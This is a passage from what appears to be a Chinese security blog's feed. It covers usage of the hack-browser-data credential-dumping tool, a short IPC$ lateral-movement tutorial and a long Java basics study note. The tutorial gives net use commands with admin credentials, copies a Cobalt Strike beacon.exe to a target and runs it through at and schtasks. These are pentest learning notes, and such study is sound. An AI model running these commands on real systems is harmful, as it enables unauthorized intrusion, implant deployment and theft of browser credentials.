<p>某些情况下，这款安全工具会被 Windows Defender 或其他杀毒软件当作病毒导致无法执行。代码已经全部开源，可自行编译。</p>
<p>使用方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\hack-browser-data.exe -b all -f json --dir results -zip</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\hack-browser-data.exe -h</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>IPC横向</title>
    <url>/2022/09/14/IPC%E6%A8%AA%E5%90%91/</url>
    <content><![CDATA[<h1 id="IPC横向"><a href="#IPC横向" class="headerlink" title="IPC横向"></a>IPC横向</h1><p><strong>IPC横向</strong><br>IPC(Internet Process Connection)共享命名管道的资源，<br>是为了实现进程间通信而开放的命名管道。<br>IPC可以通过验证用户名和密码获得相应的权限，使用139、445端口。</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1，目标主机开启了139和445端口</span><br><span class="line">2，目标主机管理员开启了ipc$默认共享：</span><br><span class="line">3，知道目标机的账号密码</span><br></pre></td></tr></table></figure>

<h2 id="建立IPC连接"><a href="#建立IPC连接" class="headerlink" title="建立IPC连接"></a>建立IPC连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">建立IPC连接命令：</span><br><span class="line">net use \\172.16.1.132\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;	#工作组</span><br><span class="line">net use \server\ipc$&quot;password&quot; /user:domain\username 			#域内</span><br><span class="line"></span><br><span class="line">查看连接是否建立</span><br><span class="line">net use</span><br><span class="line"></span><br><span class="line">查看目标主机的文件</span><br><span class="line">dir  \\172.16.1.132\c$</span><br><span class="line"></span><br><span class="line">查看目标主机的共享</span><br><span class="line">net view 172.16.1.132</span><br><span class="line"></span><br><span class="line">断开连接：</span><br><span class="line">net use \\172.16.1.132\ipc$ /del</span><br></pre></td></tr></table></figure>

<h2 id="上传木马，任务计划执行木马上线CS"><a href="#上传木马，任务计划执行木马上线CS" class="headerlink" title="上传木马，任务计划执行木马上线CS"></a><strong>上传木马，任务计划执行木马上线CS</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传木马</span><br><span class="line">copy beacon.exe \\172.16.132\c$</span><br><span class="line"></span><br><span class="line">创建计划任务(at&lt;2012、schtasks&gt;=2012)：</span><br><span class="line">at \\172.16.1.132 19:00 c:\beacon.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">schtasks 在windows版本大于等于windows2012下使用</span><br><span class="line"></span><br><span class="line">shctasks /create /s 192.168.xx.xx /run &quot;system&quot; /tn adduser /scDAILY /tr c:\1.bat /F #创建adduser任务对应批处理脚本</span><br><span class="line"></span><br><span class="line">schtasks  /run /s 192.168.xx.xx /tn adduser /i #运行adduser任务</span><br><span class="line"></span><br><span class="line">schtasks /delete /s 192.168.xx.xx /tn adduser /f #删除adduser任务</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>JAVA基础-1</title>
    <url>/2022/12/20/JAVA%E5%9F%BA%E7%A1%80-1/</url>
    <content><![CDATA[<h1 id="JAVA基础-1"><a href="#JAVA基础-1" class="headerlink" title="JAVA基础-1"></a>JAVA基础-1</h1><p>终于是又开坑学java了，简单记录一下自己的java学习笔记。毕竟是网安跨不过的坎，本文可能有些长，供作者自己学习。</p>
<h1 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h1><p>1.编写代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：</span><br><span class="line">（1）代码的结构</span><br><span class="line">类&#123;</span><br><span class="line">	方法&#123;</span><br><span class="line">		语句;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line">（2）必须把代码文件保存为xx.java</span><br><span class="line">文件名建议和类名一样</span><br></pre></td></tr></table></figure>

<p>2.编译</p>
<p>编译工具：javac.exe</p>
<p>使用格式：<code>javac xx.java</code></p>
<p>3.运行</p>
<p>工具：java.exe</p>
<p>格式：java 主类名（包含main方法的类名）</p>
<h2 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">helloworld</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中有一个方法<code>public static void mian(String[] args)</code>这是最特殊的一个方法，叫做主方法，main方法。他是java程序的入口。他的格式是固定的。</p>
<p><img src="/2022/12/20/JAVA%E5%9F%BA%E7%A1%80-1/image-20221204173931603.png" alt="image-20221204173931603"></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="中文编码问题"><a href="#中文编码问题" class="headerlink" title="中文编码问题"></a>中文编码问题</h3><p>如果xx.java文件的编码是UTF-8的，又不想改文件的编码，所以在编译的时候，可以加一个参数<code>-encoding UTF-8</code></p>
<p>除了在编译的时候使用指定编码进行编译，也可以通过编辑器上面的选项来进行修改文件本身的编码。</p>
<h3 id="大小写问题"><a href="#大小写问题" class="headerlink" title="大小写问题"></a>大小写问题</h3><p>java代码中是严格区分大小写的。</p>
<p>但是在编译的时候，其文件名是可以随意大小写的。注意：只是在编译的时候，运行的时候，文件名是不可以随意大小写的。（win系统）</p>
<p>xx.class文件的文件名也是区分大小写的。因为xx.class文件名，代表的就是类名。</p>
<h3 id="文件名和类名的一致问题"><a href="#文件名和类名的一致问题" class="headerlink" title="文件名和类名的一致问题"></a>文件名和类名的一致问题</h3><p>如果class不是public的，那么xx.java源文件名可以和类名不一样</p>
<p>如果class是public的，那么xx.java源文件名必须和类名一样</p>
<p>所以建议都保持一致即可。</p>
<h3 id="java关键字"><a href="#java关键字" class="headerlink" title="java关键字"></a>java关键字</h3><p>关键字：有特殊意义的和特殊作用的单词，java一共有50个关键字。</p>
<p>其中还有两个保留字，相当于还未正式启用的关键字。（const,goto）他俩是c语言的关键字，但是java没有用它。</p>
<p>还有三个特殊值，他们不是关键字，但是又特殊意义。他们不在关键字表中：true,false,null</p>
<p>值得注意的是，50个关键字全部都是小写的。</p>
<p><img src="/2022/12/20/JAVA%E5%9F%BA%E7%A1%80-1/image-20221204182333118.png" alt="image-20221204182333118"></p>
<h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>凡是代码中需要自己“命名”的地方都是标识符。给变量、类、方法等命名的字符序列就是标识符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标识符的命名规则：</span><br><span class="line">1.只能使用26个英文字母大小写，数字0-9，下划线_，美元符号$</span><br><span class="line">按理说，所有unicode编码中的字符都能用，但是对于中文来说，还要解决编码问题，所以不要用</span><br><span class="line">2.数字不能开头</span><br><span class="line">3.不能直接使用关键字，保留字，特殊字，但是可以包含。</span><br><span class="line">4.严格区分大小写</span><br><span class="line">5.不能包含空格</span><br><span class="line"></span><br><span class="line">命名规范（人为规定）：</span><br><span class="line">1.见名知意</span><br><span class="line">2.类名，每个单词的首字母大写</span><br><span class="line">3.变量名，方法名：从第二个单词开始首字母大写</span><br><span class="line">4.包名，所有单词都小写，单词与单词之间使用.分隔。</span><br><span class="line">5.常亮所有单词都大写</span><br></pre></td></tr></table></figure>

<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>java的数据类型主要分为两大类</p>
<p>第一种是基本数据类型（8种，延续的c语言中的数据类型，因为java是由c语言发展而来）</p>
<p>整数类型：byte,short,int,long</p>
<p>小数类型：float,double 这两种都叫做浮点型，不精确</p>
<p>单字符类型：char</p>
<p>布尔型：boolean 只有两个值，true,false</p>
<p>第二大类是应用数据类型：</p>
<p>数组，类，接口，枚举，注解等。</p>
<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>代码里面写死的，固定不变的。</p>
<p>如下就是整数常量值1.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantValue</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量必须先声明后使用</span><br><span class="line">变量在使用之前必须初始化</span><br><span class="line">变量值的类型必须与变量申明的类型一致或者兼容</span><br><span class="line">变量有作用域，同一个作用域中不能重复申明</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Variable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> age = <span class="number">1</span>;</span><br><span class="line">        System.out.println(age);</span><br><span class="line"></span><br><span class="line">        age = <span class="number">3</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span> + age);<span class="comment">//java中也可以使用加号进行拼接，输出的时候拼接就可。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="最终变量-常量"><a href="#最终变量-常量" class="headerlink" title="最终变量\常量"></a>最终变量\常量</h3><p>这算是一个特殊的常量或者变量。也就是申明了一个变量之后，这个变量在整个代码中不能更改，申明一个最终变量就可以了。</p>
<p>如何申明，将变量申明为final，如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> max = <span class="number">150</span>;</span><br></pre></td></tr></table></figure>

<h3 id="进制的表示"><a href="#进制的表示" class="headerlink" title="进制的表示"></a>进制的表示</h3><p>值得注意的是，输出的时候都是以十进制的形式来输出的。</p>
<p><img src="/2022/12/20/JAVA%E5%9F%BA%E7%A1%80-1/image-20221205122144879.png" alt="image-20221205122144879"></p>
<h3 id="程序中表示字符的方法"><a href="#程序中表示字符的方法" class="headerlink" title="程序中表示字符的方法"></a>程序中表示字符的方法</h3><p>在java中除了直接用双引号表示的字符之外，也可以用数字的形式来定义一个字符。</p>
<p>如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestChar</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> c1 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">char</span> c2 = <span class="number">97</span>;</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的就是两个a，因为在unicode编码中，97就是a。（编码可以使用十六进制或者十进制）</p>
<p>注意：部分字符需要转义的方式使用，比如说<code>\，换行符，单引号，双引号等等</code></p>
<h3 id="基本数据类型的转换问题"><a href="#基本数据类型的转换问题" class="headerlink" title="基本数据类型的转换问题"></a>基本数据类型的转换问题</h3><p>基本数据类型的转换分为两种：自动类型转换（隐式转换），强制类型转换（显式转换）</p>
<p>（1）自动类型转换</p>
<p>A：当把存储范围小的值（常量值，变量值，表达式的结果值）赋值给存储范围大的变量时，就会发生自动类型转换。</p>
<p><code>byte-&gt;short-&gt;int-&gt;long-&gt;float-&gt;double</code></p>
<p>值得注意的是，short和char同级。</p>
<p>B：当多种数据类型的数据混合运算时，会自动提升为他们中存储范围最大的哪一个。</p>
<p>如果将char加上整数型，那么表达式的结果就是整数型。</p>
<p>（2）强制类型转换</p>
<p>想要将数据或者变量强制转换成响应的类型可以使用如下语法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span> b1 = <span class="number">127</span>;</span><br><span class="line"><span class="keyword">byte</span> b2 = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> b3 = b1 + b2;<span class="comment">//b1+b2自动提升为int类型</span></span><br><span class="line"><span class="keyword">byte</span> b4 = (<span class="keyword">byte</span>)(b1+b2);<span class="comment">//强制转换为byte类型</span></span><br></pre></td></tr></table></figure>

<p>扩展：</p>
<p>虽然字符串类型不是基本数据类型，但是还是值得说一下的。</p>
<p>我们运行如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestChar</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> c1 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">char</span> c2 = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        System.out.println(c1 + c2);</span><br><span class="line">        System.out.println(<span class="string">&quot;c1+c2=&quot;</span>+c1+c2);</span><br><span class="line">        System.out.println(c1 + c2 + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        System.out.println(c1 + <span class="string">&quot;&quot;</span> + c2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出结果为：</span><br><span class="line">195  //char+char自动提升为int类型</span><br><span class="line">c1+c2=ab  //前面的&quot;c1+c2=&quot;属于的是string常量，一旦这个常量参与了，后面的加号就变成了“拼接”。</span><br><span class="line">195  //虽然后面有一个空字符串，但是因为我们先计算的前面两个值。</span><br><span class="line">ab  //因为空字符串在中间，所以加号代表的就是拼接。</span><br></pre></td></tr></table></figure>

<h3 id="运算符的分类"><a href="#运算符的分类" class="headerlink" title="运算符的分类"></a>运算符的分类</h3><p>运算符有两种分类标准。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A：按照运算符的功能分类</span><br><span class="line">1.算术运算符：</span><br><span class="line">加减乘除，模取余（模和取余在java中是一样的）</span><br><span class="line">自增，自减  ++</span><br><span class="line">正负号</span><br><span class="line">2.比较运算符/关系运算符</span><br><span class="line">大于小于，大于等于，大于小于，等于，不等于</span><br><span class="line">3.逻辑运算符</span><br><span class="line">逻辑与：&amp;</span><br><span class="line">逻辑或：|</span><br><span class="line">逻辑非：!</span><br><span class="line">逻辑异或：^</span><br><span class="line">短路与：&amp;&amp;</span><br><span class="line">短路或：||</span><br><span class="line">4.条件运算符</span><br><span class="line">条件表达式 ? 结果表达式 : 结果表达式</span><br><span class="line">5.位运算符</span><br><span class="line">左移：&lt;&lt;</span><br><span class="line">右移：&gt;&gt;</span><br><span class="line">无符号右移：&gt;&gt;&gt;</span><br><span class="line">按位与：&amp;</span><br><span class="line">按位或：|</span><br><span class="line">按位取反:~</span><br><span class="line">按位异或：^</span><br><span class="line">6.赋值运算符</span><br><span class="line">=,+=,-=,/=,&amp;=等等</span><br></pre></td></tr></table></figure>

<p>扩展</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在处理自增的时候，java优先从左开始</span><br></pre></td></tr></table></figure>



<h3 id="java反编译"><a href="#java反编译" class="headerlink" title="java反编译"></a>java反编译</h3><p>可以通过在命令行中是用javap命令来进行反编译任意一个java类，-c参数代表打印类中每个方法的反汇编代码，例如包含java字节码的指令。</p>
<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p><img src="/2022/12/20/JAVA%E5%9F%BA%E7%A1%80-1/image-20221206134233669.png" alt="image-20221206134233669"></p>
<h1 id="IDEA开发工具"><a href="#IDEA开发工具" class="headerlink" title="IDEA开发工具"></a>IDEA开发工具</h1><p>安装卸载我这里就不写啦，之前安装过了，而且网上有很多教程</p>
<h2 id="创建空工程和模块"><a href="#创建空工程和模块" class="headerlink" title="创建空工程和模块"></a>创建空工程和模块</h2><p>在创建工程的时候，可以先创建一个空工程，没有必要马上创建一个java工程。</p>
<p>在空工程中创建一个新的模块，在选模块的时候就可以选择java模块。方便。</p>
<h2 id="快捷键与代码模板介绍"><a href="#快捷键与代码模板介绍" class="headerlink" title="快捷键与代码模板介绍"></a>快捷键与代码模板介绍</h2><p>按两次shift就可以弹出搜索框，可以搜索任何东西，不过中英文的切换导致一直弹出也不好，可以自行选择取消。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在对的位置输入main之后，按下回车就可以自动生成主方法的代码，也就是public static void main(String[] args)&#123;&#125;</span><br><span class="line"></span><br><span class="line">同样，输入sout之后按下回车就可以自动填充输出的代码，也就是System.out.printlb(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">psvm:public static void main(String[] args)&#123;&#125;</span><br><span class="line">main:public static void main(String[] args)&#123;&#125;</span><br><span class="line"></span><br><span class="line">soutp:System.out.println(&quot;xxx:&quot;+方法形参);</span><br><span class="line">soutm:System.out.println(&quot;xx类，当前方法名&quot;);</span><br><span class="line">soutv:System.out.println(&quot;变量名=&quot;+变量);</span><br><span class="line">变量.sout:System.out.println(&quot;变量名=&quot;+变量);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释快捷键</span><br><span class="line">单行注释：ctrl+/</span><br><span class="line">多行注释：ctrl+shift+/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制行：ctrl+D</span><br><span class="line">剪切行：ctrl+X</span><br><span class="line">删除行：ctrl+Y</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量重命名</span><br><span class="line">选中变量声明的位置：shift+f6</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式化代码</span><br><span class="line">ctrl+alt+L</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">转换大小写</span><br><span class="line">ctrl+shift+U</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自动声明变量接收方法调用表达式结果</span><br><span class="line">ctrl+v</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">移动单行代码</span><br><span class="line">ctrl+shift+↑(↓)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">光标定位在红的地方，智能提示错误</span><br><span class="line">alt+回车</span><br></pre></td></tr></table></figure>

<h1 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h1><h2 id="表达式和语句"><a href="#表达式和语句" class="headerlink" title="表达式和语句"></a>表达式和语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java中有：</span><br><span class="line">（1）常量和变量：代表数据值</span><br><span class="line">（2）表达式</span><br><span class="line">计算和判断、赋值表达式</span><br><span class="line">方法调用表达式（听名字就感觉是一个函数然后返回一个值）</span><br><span class="line">（3）语句</span><br><span class="line">不是所有的表达式直接加分号都可以构成语句，只有部分可以，例如：</span><br><span class="line">A：方法调用表达式</span><br><span class="line">B：new表达式</span><br><span class="line">C：自增自减表达式</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语句的分类：</span><br><span class="line">两大类：</span><br><span class="line">	单语句：独立一条语句，例如System.out.println(&quot;&quot;);（特殊的单语句，空语句，就是一个分号;）</span><br><span class="line">	复合语句：多语句组成一个整体。通常都会用&#123;&#125;把多个语句包围起来。例如ifelse。</span><br><span class="line"></span><br><span class="line">复合语句因为有很多语句组成，所以有流程控制语句概念：</span><br><span class="line">（1）顺序结构：从上往下依次执行</span><br><span class="line">（2）分支结构：多个语句可能只执行其中一个</span><br><span class="line">（3）循环结构：某个语句会被反复或者重复执行</span><br></pre></td></tr></table></figure>

<h2 id="几种输出语句"><a href="#几种输出语句" class="headerlink" title="几种输出语句"></a>几种输出语句</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;&quot;</span>);  <span class="comment">//输出并换行，（）中只能写一个值，如果有多个值必须使用加号拼接起来。</span></span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);  <span class="comment">//这个东西不能输出空行，上面可以。 </span></span><br><span class="line"></span><br><span class="line">第三种作为了解，名字为格式化输出。就是py里面的感觉就是，可以用%d来当做占位符，下面将演示一下。</span><br><span class="line">输出不同的数据类型，并且小数显示小数点后两位。也就是System.out.printf(<span class="string">&quot;num=%d&quot;</span>,num)</span><br></pre></td></tr></table></figure>

<h2 id="各种类型的数据输入"><a href="#各种类型的数据输入" class="headerlink" title="各种类型的数据输入"></a>各种类型的数据输入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">控制台键盘输入：</span><br><span class="line">1.先声明一个scanner类型的变量</span><br><span class="line">scanner：是一个文本扫描仪类型，他的全名是java.util.Scanner,她的核心是类库中定义好的，可以直接使用</span><br><span class="line">Scanner是一个类，不是基本数据类型，是引用数据类型，所以必须给他赋值一个“对象”。</span><br><span class="line"></span><br><span class="line">2.接收用户输入的数据，并且赋值给何时的变量</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">scanner声明小技巧：</span><br><span class="line"><span class="comment">//java.util.Scanner input = new java.util.Scanner(System.in);</span></span><br><span class="line"><span class="comment">//int Anint = input.nextInt();</span></span><br><span class="line">先在上面加入导包语句，随后可以简单的调用</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="comment">//这句代码唯一可以改的是input，他是一个变量名。</span></span><br></pre></td></tr></table></figure>

<p>像上面使用的方法<code>nextInt</code>其他数据类型都可以替换int，除了字符串类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input.next(); //接收一个字符串，很多个字符</span><br><span class="line">input.next().charAt(0); //表示从多个字符中取一个字符，取第一个，那个0就是顺序之类的。</span><br></pre></td></tr></table></figure>

<p>注意，在使用完之后，需要使用代码<code>input.close()</code>将这个东西关闭，避免占领过多的内存！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扩展：</span><br><span class="line">next()和nextlint()的区别</span><br><span class="line">next方法，在读取用户输入的数据时，遇到空格或者是其他的空白符，tab之类的，就会认为输入结束。</span><br><span class="line"></span><br><span class="line">同时，nextint方法不会读取回车或者换行符，所以如果使用的nextint方法，必须要使用nextline将回车读取掉才可以。</span><br></pre></td></tr></table></figure>

<h3 id="练习，输出个人信息"><a href="#练习，输出个人信息" class="headerlink" title="练习，输出个人信息"></a>练习，输出个人信息</h3><p>就是让用户输入个人信息，用变量存储，然后依次输出即可，本身就有代码基础，写这个练习单纯是为了更方便适应java的开发。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入您的姓名：&quot;</span>);</span><br><span class="line">        java.util.Scanner input = <span class="keyword">new</span> java.util.Scanner(System.in); <span class="comment">//声明了一个类</span></span><br><span class="line">        String name = input.nextLine();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入您的年龄&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> age = input.nextInt();</span><br><span class="line">        input.nextLine(); <span class="comment">//将回车读取掉</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入您的性别：&quot;</span>);</span><br><span class="line">        String sex = input.nextLine();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;以下是您的个人信息：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span>+name);</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span>+age);</span><br><span class="line">        System.out.println(<span class="string">&quot;性别：&quot;</span>+sex);</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="双分支条件判断else-if"><a href="#双分支条件判断else-if" class="headerlink" title="双分支条件判断else..if.."></a>双分支条件判断else..if..</h2><p>用以下例子来进行学习</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从键盘输入一个整数，如果是偶数，就输出偶数，否则就输出技术。</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入一个整数：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> num = input.nextInt();</span><br><span class="line">        input.nextLine(); <span class="comment">//将回车读取掉</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(num%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(num+<span class="string">&quot;是偶数&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(num+<span class="string">&quot;是奇数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="多分支条件判断"><a href="#多分支条件判断" class="headerlink" title="多分支条件判断"></a>多分支条件判断</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概就这样，执行特点：</p>
<p>（1）从上往下执行，如果上面的条件成立了，下面的条件就不会判断了。</p>
<h2 id="选择结构switch-case"><a href="#选择结构switch-case" class="headerlink" title="选择结构switch case"></a>选择结构switch case</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line">	<span class="keyword">case</span> 常量值<span class="number">1</span>:</span><br><span class="line">        语句块<span class="number">1</span></span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">2</span>:</span><br><span class="line">    	语句块<span class="number">2</span>    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>特点:</p>
<p>1.入口</p>
<p>2.出口</p>
<p>3.一旦找到入口，就会一直执行下去，直到找到出口。必须要在里面加入出口的语句。（穿透性，有些地方可以利用，还是py好啊，什么穿透性不穿透性，太麻烦了。）</p>
<p>也就是必须要加入break或者return</p>
<p>值得注意的是，case后面只能是常量，不能使用变量！</p>
<h2 id="循环结构-while"><a href="#循环结构-while" class="headerlink" title="循环结构 while"></a>循环结构 while</h2><p>首先值得注意的是，无论哪种循环都可以是实现其他循环达到的事情。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(循环条件)&#123;</span><br><span class="line">    循环体语句块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">特点</span><br><span class="line">1.先判断循环条件表达式，如果成立就执行循环语句块</span><br></pre></td></tr></table></figure>

<h2 id="循环结构-do-while"><a href="#循环结构-do-while" class="headerlink" title="循环结构 do..while"></a>循环结构 do..while</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">do&#123;循环体语句块;</span><br><span class="line">&#125;while(循环条件)</span><br></pre></td></tr></table></figure>

<p>例子:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;<span class="keyword">while</span>(i &lt; <span class="number">10</span>);</span><br><span 